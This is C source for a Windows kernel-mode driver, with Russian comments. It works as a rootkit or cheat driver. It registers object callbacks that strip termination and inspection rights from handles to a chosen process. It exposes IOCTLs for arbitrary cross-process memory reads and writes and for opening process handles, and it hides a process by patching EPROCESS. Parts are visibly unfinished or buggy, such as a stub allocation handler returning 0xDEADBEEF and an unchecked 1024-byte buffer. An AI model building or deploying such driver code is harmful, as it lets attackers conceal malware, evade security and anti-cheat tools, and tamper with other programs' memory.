#include <ntddk.h>
#include "Header.h"

char* ProcNameForCallback = "";
int PIDproc = 0;
int flagToCallback = 0;

VOID UnloadRoutine(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING deviceLinkUnicodeString;
	PDEVICE_EXTENSION extension;
	extension = DriverObject->DeviceObject->DeviceExtension;
	RtlInitUnicodeString(&deviceLinkUnicodeString, DOS_DEVICE_NAME);
	IoDeleteSymbolicLink(&deviceLinkUnicodeString);
	IoDeleteDevice(DriverObject->DeviceObject);
	

	FreeProcFilter();//Если не снять каллбэки - получишь бсод
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Unloaded\n");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	PDEVICE_OBJECT deviceObject;
	UNICODE_STRING deviceNameUnicodeString;
	UNICODE_STRING deviceLinkUnicodeString;
	PDEVICE_EXTENSION extension;
	NTSTATUS ntStatus;

	DbgPrint("Driver was loaded\n");

	RtlInitUnicodeString(&deviceNameUnicodeString, NT_DEVICE_NAME);

	ntStatus = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &deviceNameUnicodeString, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);

	if (!NT_SUCCESS(ntStatus)) return ntStatus;

	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;
	DriverObject->DriverUnload = UnloadRoutine;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverOpen;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverClose;

	extension = (PDEVICE_EXTENSION)deviceObject->DeviceExtension;
	extension->DeviceObject = deviceObject;
	extension->DriverObject = DriverObject;


	RtlInitUnicodeString(&deviceLinkUnicodeString, DOS_DEVICE_NAME);
	
//	if (flagToCallback) {
		ntStatus = RegisterCallbackFunction();
		if (!NT_SUCCESS(ntStatus)) {
			DbgPrint("Failed setup callback");
		}
		else {
			DbgPrint("Callback");
		}
//	}
	
	ntStatus = IoCreateSymbolicLink(&deviceLinkUnicodeString, &deviceNameUnicodeString);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(deviceObject);
		return ntStatus;
	}

	return STATUS_SUCCESS;
}

NTSTATUS DriverOpen(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


NTSTATUS DriverClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


///Pre operation callback
OB_PREOP_CALLBACK_STATUS ObjectPreCallback(
	IN  PVOID RegistrationContext,
	IN  POB_PRE_OPERATION_INFORMATION OperationInformation
)
{
	LPSTR ProcName;

	UNREFERENCED_PARAMETER(RegistrationContext);

	ProcName = GetProcessNameFromPid(PsGetProcessId((PEPROCESS)OperationInformation->Object));

//	if (!_stricmp(ProcName, ProcNameForCallback))
	if (PsGetProcessId((PEPROCESS)OperationInformation->Object) == PIDproc && PIDproc != 0)
	{
		DbgPrint("Validation with pid (%i) OK.", PIDproc);
		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
		{
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_OPERATION) == PROCESS_VM_OPERATION)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & ~PROCESS_VM_READ) == PROCESS_VM_READ)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_VM_WRITE) == PROCESS_VM_WRITE)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_WRITE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_QUERY_INFORMATION) == PROCESS_QUERY_INFORMATION)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_QUERY_INFORMATION;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_DUP_HANDLE) == PROCESS_DUP_HANDLE)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_SET_QUOTA) == PROCESS_SET_QUOTA)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_SET_QUOTA;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_SET_INFORMATION) == PROCESS_SET_INFORMATION)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_SET_INFORMATION;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_CREATE_THREAD) == PROCESS_CREATE_THREAD)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_QUERY_LIMITED_INFORMATION) == PROCESS_QUERY_LIMITED_INFORMATION)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_QUERY_LIMITED_INFORMATION;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_CREATE_PROCESS) == PROCESS_CREATE_PROCESS)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_PROCESS;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_SUSPEND_RESUME) == PROCESS_SUSPEND_RESUME)
			{
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_SUSPEND_RESUME;
			}
			
		}
	}
	return OB_PREOP_SUCCESS;
}

///Post operation callback
VOID ObjectPostCallback(IN  PVOID RegistrationContext, IN  POB_POST_OPERATION_INFORMATION OperationInformation)
{
	if (PsGetProcessId((PEPROCESS)OperationInformation->Object) == PIDproc && PIDproc != 0)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "PostProcCreateRoutine. \n");
	}
}

NTSTATUS RegisterCallbackFunction()
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	UNICODE_STRING Altitude;
	USHORT filterVersion = ObGetFilterVersion();
	USHORT registrationCount = 1;
	OB_OPERATION_REGISTRATION RegisterOperation;
	OB_CALLBACK_REGISTRATION RegisterCallBack;
	REG_CONTEXT RegistrationContext;
	
	memset(&RegisterOperation, 0, sizeof(OB_OPERATION_REGISTRATION));
	memset(&RegisterCallBack, 0, sizeof(OB_CALLBACK_REGISTRATION));
	memset(&RegistrationContext, 0, sizeof(REG_CONTEXT));
	RegistrationContext.ulIndex = 1;
	RegistrationContext.Version = 120;
	if (filterVersion == OB_FLT_REGISTRATION_VERSION) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "OB_FLT_REGISTRATION_VERSION: OK\n");

		RegisterOperation.ObjectType = PsProcessType;
		RegisterOperation.Operations = OB_OPERATION_HANDLE_CREATE;
		RegisterOperation.PreOperation = ObjectPreCallback;
		RegisterOperation.PostOperation = ObjectPostCallback;
		RegisterCallBack.Version = OB_FLT_REGISTRATION_VERSION;
		RegisterCallBack.OperationRegistrationCount = registrationCount;
		RtlInitUnicodeString(&Altitude, L"XXXXXXX");
		RegisterCallBack.Altitude = Altitude;
		RegisterCallBack.RegistrationContext = &RegistrationContext;
		RegisterCallBack.OperationRegistration = &RegisterOperation;
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "CallBack entry\n");


		ntStatus = ObRegisterCallbacks(&RegisterCallBack, &_CallBacks_Handle);
		if (ntStatus == STATUS_SUCCESS) {
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Register Callback Function Successful\n");
		}
		else {
			if (ntStatus == STATUS_FLT_INSTANCE_ALTITUDE_COLLISION) {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "STATUS_FLT_INSTANCE_ALTITUDE_COLLISION\n");
			}
			if (ntStatus == STATUS_INVALID_PARAMETER) {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "STATUS_INVALID_PARAMETER\n");
			}
			if (ntStatus == STATUS_ACCESS_DENIED) {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "STATUS_ACCESS_DENIED\n");
			}
			if (ntStatus == STATUS_INSUFFICIENT_RESOURCES) {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "STATUS_INSUFFICIENT_RESOURCES\n");
			}
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "NTSTATUS 0x%08x\n", ntStatus);
		}
	}
	else {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "OB_FLT_REGISTRATION_VERSION: NE OK\n");
	}
	return ntStatus;
}

NTSTATUS FreeProcFilter()
{
	if (NULL != _CallBacks_Handle)
	{
		ObUnRegisterCallbacks(_CallBacks_Handle);
		_CallBacks_Handle = NULL;
	}
	DbgPrint("DRIVER: FreeprocCallbacks\n");
	return STATUS_SUCCESS;
}

LPSTR GetProcessNameFromPid(HANDLE pid)
{
	PEPROCESS Process;
	if (PsLookupProcessByProcessId(pid, &Process) == STATUS_INVALID_PARAMETER)
	{
		return "pid???";
	}
	return (LPSTR)PsGetProcessImageFileName(Process);
}

NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID SourceAddress, PVOID TargetAddress, SIZE_T Size)
{
	PEPROCESS SourceProcess = Process;
	PEPROCESS TargetProcess = PsGetCurrentProcess();
	SIZE_T Result;
	if (NT_SUCCESS(MmCopyVirtualMemory(SourceProcess, SourceAddress, TargetProcess, TargetAddress, Size, KernelMode, &Result)))
		return STATUS_SUCCESS; 
	else
		return STATUS_ACCESS_DENIED;
}
NTSTATUS KeWriteProcessMemory(PEPROCESS Process, PVOID SourceAddress, PVOID TargetAddress, SIZE_T Size)
{    
	PEPROCESS SourceProcess = PsGetCurrentProcess();
	PEPROCESS TargetProcess = Process;
	SIZE_T Result;

	if (NT_SUCCESS(MmCopyVirtualMemory(SourceProcess, SourceAddress, TargetProcess, TargetAddress, Size, KernelMode, &Result)))
		return STATUS_SUCCESS;
	else
		return STATUS_ACCESS_DENIED;

}

HANDLE OpenCsrss(int pid) {
	
/*	HANDLE ProcessHandle;
	NTSTATUS status = STATUS_SUCCESS;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES oa;

	
	ClientId.UniqueThread = (HANDLE)0;
	ClientId.UniqueProcess = (HANDLE)pid;

	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	status = ZwOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &oa, &ClientId);
	//ZwTerminateProcess(ProcessHandle, 0);*/
	
	PEPROCESS proc;
	PsLookupProcessByProcessId((HANDLE)pid, &proc);
	KeAttachProcess((PKPROCESS)proc);
	HANDLE hProcessHandle = NtCurrentProcess();
	//NtDuplicateObject();
	KeDetachProcess();
	return hProcessHandle;
}

NTSTATUS
DriverDeviceControl(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	NTSTATUS ntStatus;
	PIO_STACK_LOCATION irpStack;
	PDEVICE_EXTENSION extension;
	PVOID ioBuffer;
	ULONG ioControlCode;
	ULONG port = 0;
	ULONG pid;

	memadactr* memd;
	RWRITE_PARAMS rwParams;
	READ_PARAMS readParams;
	VIRTUAL_ALLOC_MEM_PARAMS VallParams;

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	irpStack = IoGetCurrentIrpStackLocation(Irp);
	extension = DeviceObject->DeviceExtension;
	ioBuffer = Irp->AssociatedIrp.SystemBuffer;
	ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	HANDLE testHandle = 0;
	int *test1 = 0;
	int pidToOpen = 0;
	int hide_pid;
	switch (ioControlCode)
	{
	case IOCTL_SETUPOBJECTPRECALLBACK:
	
	//	pid = (ULONG)ioBuffer[0];
	//	PIDproc = (int)ioBuffer[0];
	//	flagToCallback = 1;
		PIDproc = *(int*)ioBuffer;
		DbgPrint("DRIVER: Pid - %i", PIDproc);
		RtlZeroMemory(ioBuffer, irpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case IOCTL_FREEPROCFILTERCALLBACK:
		flagToCallback = 0;
		FreeProcFilter();
		break;

	case IOCTL_SENDSTRUCTTEST:
		memd = (memadactr*)ioBuffer;

		DbgPrint("DRIVER: I:%i, B:%i", memd->i, memd->b);
		DbgPrint("Buffer length: %i", irpStack->Parameters.DeviceIoControl.InputBufferLength);
		RtlZeroMemory(ioBuffer, irpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case IOCTL_WRITEMEMORY:
		rwParams = *(RWRITE_PARAMS*)ioBuffer;
		DbgPrint("Buffer length: %i", irpStack->Parameters.DeviceIoControl.InputBufferLength);
		if (rwParams.PID != 0 && rwParams.Size != 0 && rwParams.SourceA != 0 && rwParams.TargetA != 0) {
			PVOID TargetAdr = rwParams.TargetA;
			DWORD32 targa = TargetAdr;
			PEPROCESS Process;
			PsLookupProcessByProcessId(rwParams.PID, &Process);
			DbgPrint("PID: %i, Size: %i, Target: 0x%X", rwParams.PID, rwParams.Size, targa);
			NTSTATUS KeWriteStat = KeWriteProcessMemory(Process, rwParams.SourceA, targa, rwParams.Size);
			if (KeWriteStat == STATUS_SUCCESS)
				DbgPrint("Memory was writted");
		}
		else {
			DbgPrint("DRIVER: error when writting");
		}
		RtlZeroMemory(ioBuffer, irpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	case IOCTL_READMEMORY:
		readParams = *(READ_PARAMS*)ioBuffer;
		DbgPrint("Out Buffer length: %i", irpStack->Parameters.DeviceIoControl.OutputBufferLength);
		char BufferR[1024];
		int test;
		PVOID SourceAdr = readParams.SourceA;
		DWORD32 Sourcea1 = SourceAdr;
		PEPROCESS ProcessR;
		PsLookupProcessByProcessId(readParams.PID, &ProcessR);
		DbgPrint("PID: %i, Size: %i, Source: 0x%X", readParams.PID, readParams.Size, Sourcea1);
		NTSTATUS KeReadStat = KeReadProcessMemory(ProcessR, Sourcea1, &BufferR, readParams.Size);
		
		if(KeReadStat == STATUS_SUCCESS)
		DbgPrint("Memory was readed");
	
		RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, BufferR, readParams.Size);
		Irp->IoStatus.Information = readParams.Size;

		break;
		
	case IOCTL_OPENPROCESSCTL:
		pidToOpen = *(int*)ioBuffer;
		DbgPrint("DRIVER: Pid to get handle - %i", pidToOpen);
		DbgPrint("Output Buffer Length: %i", irpStack->Parameters.DeviceIoControl.OutputBufferLength);

		testHandle = OpenCsrss(pidToOpen);

//		RtlZeroMemory(ioBuffer, irpStack->Parameters.DeviceIoControl.InputBufferLength);
		RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &testHandle, irpStack->Parameters.DeviceIoControl.OutputBufferLength);
		Irp->IoStatus.Information = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
		break;

	case IOCTL_ALLOCMEMORY:
		VallParams = *(VIRTUAL_ALLOC_MEM_PARAMS*)ioBuffer;
		DbgPrint("DRIVER: PID - %i, Size - %i", VallParams.PID, VallParams.Size);
		DbgPrint("Input Buffer Length: %i", irpStack->Parameters.DeviceIoControl.InputBufferLength);
		
		DWORD32 Adrrr = 0xDEADBEEF;

		//		RtlZeroMemory(ioBuffer, irpStack->Parameters.DeviceIoControl.InputBufferLength);
		RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &Adrrr, irpStack->Parameters.DeviceIoControl.OutputBufferLength);
		Irp->IoStatus.Information = irpStack->Parameters.DeviceIoControl.OutputBufferLength;

	//	DbgPrint("123\n");
		break;
	case IOCTL_HIDEPROCESS:
		hide_pid = *(int*)ioBuffer;
		DbgPrint("Process to patch EPROCESS - %i", hide_pid);
		modifyTaskList(hide_pid);
		RtlZeroMemory(ioBuffer, irpStack->Parameters.DeviceIoControl.InputBufferLength);
		break;

	default:
		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		break;
	}
	
	ntStatus = Irp->IoStatus.Status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return ntStatus;
}